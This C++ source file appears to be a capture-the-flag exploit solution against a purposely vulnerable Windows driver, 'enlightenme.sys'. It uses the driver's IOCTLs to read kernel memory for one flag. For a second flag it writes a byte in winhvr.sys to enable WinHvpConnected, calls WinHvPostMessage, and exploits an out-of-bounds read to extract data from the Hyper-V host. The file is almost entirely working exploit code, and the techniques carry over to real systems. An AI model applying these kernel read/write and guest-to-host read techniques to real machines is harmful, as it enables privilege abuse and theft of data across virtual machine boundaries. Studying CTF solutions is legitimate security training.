#include <iostream>
#include <windows.h>
#include <winternl.h>

#define IOCTL_READ_BASE_ADDRESS CTL_CODE( \
	FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_WRITE_BYTE_TO_ADDRESS CTL_CODE(\
	FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_READ_BYTE_FROM_ADDRESS CTL_CODE( \
	FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_HVPOSTMESSAGE CTL_CODE( \
	FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct HV_POSTMESSAGE_PARAMS {
    UINT32 connectionid;
    UINT32 messagetype;
} HV_POSTMESSAGE_PARAMS, * PHV_POSTMESSAGE_PARAMS;

using namespace std;

extern "C" void GetFlag(INT64 offset, PCHAR flag);

void main() {
    const LPCWSTR               lpFileName = L"\\\\.\\enlightenme";
    const DWORD                 dwDesiredAccess = GENERIC_EXECUTE;
    const DWORD                 dwShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE;
    const LPSECURITY_ATTRIBUTES lpSecurityAttributes = nullptr;
    const DWORD                 dwCreationDisposition = OPEN_EXISTING;
    const DWORD                 dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;
    const HANDLE                hTemplateFile = nullptr;


    const HANDLE hDevice = CreateFile(
        lpFileName,
        dwDesiredAccess,
        dwShareMode,
        lpSecurityAttributes,
        dwCreationDisposition,
        dwFlagsAndAttributes,
        hTemplateFile
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        cout << "Cannot open driver";
        return;
    }

    //cout << "driver handle: " << hDevice << endl;
    cout << "[---------------------------------------] Flag 1" << endl;
    cout << "[+] Stage 1 - Retrieving enlightenme.sys base address" << endl;

    CHAR enlightenmemodulename[] = "enlightenme.sys";
    UINT64 enlightenmebaseaddress = 0;
    DWORD BytesReturned = 0;
    BOOL bResult = DeviceIoControl(
        hDevice,                    // device to be queried
        IOCTL_READ_BASE_ADDRESS,    // operation to perform
        &enlightenmemodulename,
        strlen(enlightenmemodulename) + 1,
        &enlightenmebaseaddress,
        8,
        &BytesReturned,
        (LPOVERLAPPED)NULL
    );

    cout << "\t[+] IOCTL_READ_BASE_ADDRESS [OUTPUT]" << endl;
    cout << "\t\t[-] bResult: " << bResult << endl;
    cout << "\t\t[-] enlightenmebaseaddress: " << hex << enlightenmebaseaddress << endl;
    cout << "\t\t[-] BytesReturned: " << BytesReturned << endl;
    
    cout << "[+] Stage 2 - Read flag from kernel space" << endl;
    char flag1[100] = "CTF-BR{aaaaaaaaaaaaaaaaaaaaaaaaaaaaa}";
    char* pflag1 = flag1;
    
    UINT64 flagoffset = enlightenmebaseaddress + 0x118F8;
    UINT8 flagpart;
    
    for (int i = 0; i < 80; i++) {
        //cout << "\t[+] IOCTL_READ_BYTE_FROM_ADDRESS [INPUT]" << endl;
        //cout << "\t\t[-] FlagOffset: " << hex << flagoffset << endl;

        bResult = DeviceIoControl(
            hDevice,
            IOCTL_READ_BYTE_FROM_ADDRESS,
            &flagoffset,
            8,
            &flagpart,
            1,
            &BytesReturned,
            (LPOVERLAPPED)NULL
        );

        //cout << "\t[+] IOCTL_READ_BYTE_FROM_ADDRESS [OUTPUT]" << endl;
        //cout << "\t\t[-] bResult: " << bResult << endl;
        //cout << "\t\t[-] BytesReturned: " << BytesReturned << endl;
        //cout << "\t\t[-] flagpart: " << hex << flagpart << endl;

        if (flagpart != 0x00) {
            memcpy(pflag1, &flagpart, 1);
            pflag1++;
        }
        flagoffset += 1;
    }
    cout << "[-] FLAG1: " << flag1 << endl;
        
    cout << "[---------------------------------------] Flag 2" << endl;
    cout << "[+] Stage 1 - Retrieving winhvr.sys base address" << endl;

    CHAR modulename[] = "winhvr.sys";
    UINT64 modulebaseaddress = 0;
    BytesReturned = 0;
    bResult = DeviceIoControl(
        hDevice,                    // device to be queried
        IOCTL_READ_BASE_ADDRESS,    // operation to perform
        &modulename,
        strlen(modulename) + 1,
        &modulebaseaddress,
        8,
        &BytesReturned,
        (LPOVERLAPPED)NULL
    );


    cout << "\t[+] IOCTL_READ_BASE_ADDRESS [OUTPUT]" << endl;
    cout << "\t\t[-] bResult: " << bResult << endl;
    cout << "\t\t[-] modulebaseaddress: " << hex << modulebaseaddress << endl;
    cout << "\t\t[-] BytesReturned: " << BytesReturned << endl;

    cout << "[+] Stage 2 - Enable WinHvpConnected" << endl;
    struct PARAMS_DISABLE_LOOP_BACK {
        UINT64 WinHvpConnected;
        BYTE value;
    };

    PARAMS_DISABLE_LOOP_BACK params = { 0 };
    params.WinHvpConnected = modulebaseaddress + 0xE7D8;
    params.value = 0x01;

    cout << "\t[+] IOCTL_WRITE_BYTE_TO_ADDRESS [INPUT]" << endl;
    cout << "\t\t[-] params.WinHvpConnected: " << hex << params.WinHvpConnected << endl;

    bResult = DeviceIoControl(
        hDevice,
        IOCTL_WRITE_BYTE_TO_ADDRESS,
        &params,
        9,
        NULL,
        0,
        &BytesReturned,
        (LPOVERLAPPED)NULL
    );

    cout << "\t[+] IOCTL_WRITE_BYTE_TO_ADDRESS [OUTPUT]" << endl;
    cout << "\t\t[-] bResult: " << bResult << endl;
    cout << "\t\t[-] BytesReturned: " << BytesReturned << endl;

    cout << "[+] Stage 3 - call WinHvPostMessage" << endl;
    
    HV_POSTMESSAGE_PARAMS paramshvpostmessage = { 0 };
    UINT64 hvStatus;
    paramshvpostmessage.connectionid = 0x42424242;
    paramshvpostmessage.messagetype = 0x43434343;

    bResult = DeviceIoControl(
        hDevice,
        IOCTL_HVPOSTMESSAGE,
        &paramshvpostmessage,
        8,
        &hvStatus,
        8,
        &BytesReturned,
        (LPOVERLAPPED)NULL
    );

    cout << "\t[+] IOCTL_HVPOSTMESSAGE [OUTPUT]" << endl;
    cout << "\t\t[-] bResult: " << bResult << endl;
    cout << "\t\t[-] BytesReturned: " << BytesReturned << endl;
    cout << "\t\t[-] hvStatus: " << hex << hvStatus << endl;

    Sleep(1000);
    char flag2[100] = "CTF-BR{bbbbbbbbbbbbbbbbbbbbbbbbbbbbb}";
    
    cout << "[+] Stage 4 - Exploit OOB read to extract flag from host" << endl;
    GetFlag(0xFFFFFFFFFFFFFFFB, flag2);
    GetFlag(0xFFFFFFFFFFFFFFFC, flag2 + 12);
    GetFlag(0xFFFFFFFFFFFFFFFD, flag2 + 24);
    GetFlag(0xFFFFFFFFFFFFFFFE, flag2 + 36);
    GetFlag(0xFFFFFFFFFFFFFFFF, flag2 + 48);

    cout << "[-] FLAG2: " << flag2 << endl;
}